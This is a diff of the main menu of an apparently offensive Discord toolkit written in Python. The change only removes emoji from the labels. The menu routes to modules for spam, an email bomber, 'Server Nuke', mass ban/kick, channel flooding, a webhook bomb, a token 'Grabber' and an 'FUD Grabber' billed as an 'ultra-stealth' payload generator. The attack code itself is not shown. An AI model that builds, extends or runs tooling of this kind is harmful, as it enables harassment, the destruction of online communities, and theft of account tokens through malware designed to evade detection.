@@ -545,18 +545,18 @@ def main_menu():
             inquirer.List('choice',
                          message="Choose a category:",
                          choices=[
-                             '💣 Spam Tools',
-                             '🔧 Discord Tools', 
-                             '🎫 Token Tools',
-                             '🖥️ Server Tools',
-                             '👤 User Tools',
-                             '⚙️ Settings Tools',
-                             '🎲 Generators',
-                             '🌐 Non-Discord Tools',
-                             '📡 Advanced Destruction Tools',
-                             '🔍 Grabber',
-                             '🕵️ FUD Grabber',
-                             '❌ Exit'
+                             ' Spam Tools',
+                             ' Discord Tools', 
+                             ' Token Tools',
+                             ' Server Tools',
+                             ' User Tools',
+                             ' Settings Tools',
+                             ' Generators',
+                             ' Non-Discord Tools',
+                             ' Advanced Destruction Tools',
+                             ' Grabber',
+                             ' FUD Grabber',
+                             ' Exit'
                          ]),
         ]
         answers = inquirer.prompt(questions)
@@ -565,27 +565,27 @@ def main_menu():
             pretty_print("See you later!   <3👋", (255,32,32))
             break
             
-        if answers['choice'] == '💣 Spam Tools':
+        if answers['choice'] == ' Spam Tools':
             spam_tools_menu()
-        elif answers['choice'] == '🔧 Discord Tools':
+        elif answers['choice'] == ' Discord Tools':
             discord_tools_menu()
-        elif answers['choice'] == '🎫 Token Tools':
+        elif answers['choice'] == ' Token Tools':
             token_tools_menu()
-        elif answers['choice'] == '🖥️ Server Tools':
+        elif answers['choice'] == ' Server Tools':
             server_tools_menu()
-        elif answers['choice'] == '👤 User Tools':
+        elif answers['choice'] == ' User Tools':
             user_tools_menu()
-        elif answers['choice'] == '⚙️ Settings Tools':
+        elif answers['choice'] == ' Settings Tools':
             settings_tools_menu()
-        elif answers['choice'] == '🎲 Generators':
+        elif answers['choice'] == ' Generators':
             generators_menu()
-        elif answers['choice'] == '🌐 Non-Discord Tools':
+        elif answers['choice'] == ' Non-Discord Tools':
             non_discord_tools_menu()
-        elif answers['choice'] == '📡 Advanced Destruction Tools':
+        elif answers['choice'] == ' Advanced Destruction Tools':
             advanced_destruction_menu()
-        elif answers['choice'] == '🔍 Grabber':
+        elif answers['choice'] == ' Grabber':
             grabber_menu()
-        elif answers['choice'] == '🕵️ FUD Grabber':
+        elif answers['choice'] == ' FUD Grabber':
             fud_grabber_menu()
 
 def spam_tools_menu():
@@ -887,7 +887,7 @@ def non_discord_tools_menu():
             inquirer.List('choice',
                          message="Non-Discord Tools - Choose an option:",
                          choices=[
-                             '💣 Email Bomber',
+                             ' Email Bomber',
                              '← Back to main menu'
                          ]),
         ]
@@ -895,7 +895,7 @@ def non_discord_tools_menu():
         if not answers or answers['choice'] == '← Back to main menu':
             break
             
-        if answers['choice'] == '💣 Email Bomber':
+        if answers['choice'] == ' Email Bomber':
             from utils.email_bomber import run_email_bomber
             run_email_bomber()
             
@@ -916,12 +916,12 @@ def advanced_destruction_menu():
             inquirer.List('choice',
                          message="Advanced Destruction Tools - Choose an option:",
                          choices=[
-                             '💥 Server Nuke',
-                             '🔨 Mass Ban/Kick Manager',
-                             '🎭 Permission Chaos',
-                             '🌊 Channel Flood',
-                             '🎨 Role Spam',
-                             '🕷️ Webhook Bomb',
+                             ' Server Nuke',
+                             ' Mass Ban/Kick Manager',
+                             ' Permission Chaos',
+                             ' Channel Flood',
+                             ' Role Spam',
+                             ' Webhook Bomb',
                              '← Back to main menu'
                          ]),
         ]
@@ -929,22 +929,22 @@ def advanced_destruction_menu():
         if not answers or answers['choice'] == '← Back to main menu':
             break
             
-        if answers['choice'] == '💥 Server Nuke':
+        if answers['choice'] == ' Server Nuke':
             from utils.server_nuke import run_server_nuke
             run_server_nuke()
-        elif answers['choice'] == '🔨 Mass Ban/Kick Manager':
+        elif answers['choice'] == ' Mass Ban/Kick Manager':
             from utils.mass_ban_kick import run_mass_ban_kick
             run_mass_ban_kick()
-        elif answers['choice'] == '🎭 Permission Chaos':
+        elif answers['choice'] == ' Permission Chaos':
             from utils.permission_chaos import run_permission_chaos
             run_permission_chaos()
-        elif answers['choice'] == '🌊 Channel Flood':
+        elif answers['choice'] == ' Channel Flood':
             from utils.channel_flood import run_channel_flood
             run_channel_flood()
-        elif answers['choice'] == '🎨 Role Spam':
+        elif answers['choice'] == ' Role Spam':
             from utils.role_spam import run_role_spam
             run_role_spam()
-        elif answers['choice'] == '🕷️ Webhook Bomb':
+        elif answers['choice'] == ' Webhook Bomb':
             from utils.webhook_bomb import run_webhook_bomb
             run_webhook_bomb()
             
@@ -961,7 +961,7 @@ def advanced_destruction_menu():
 def fud_grabber_menu():
     """FUD Grabber Menü - nur Mini Payload Generator"""
     print_banner(show_webhook=True)
-    pretty_print("🕵️ FUD GRABBER", (255, 128, 0))
+    pretty_print(" FUD GRABBER", (255, 128, 0))
     pretty_print("Ultra-stealth Mini Payload Generator", (255, 64, 64))
     print()
     
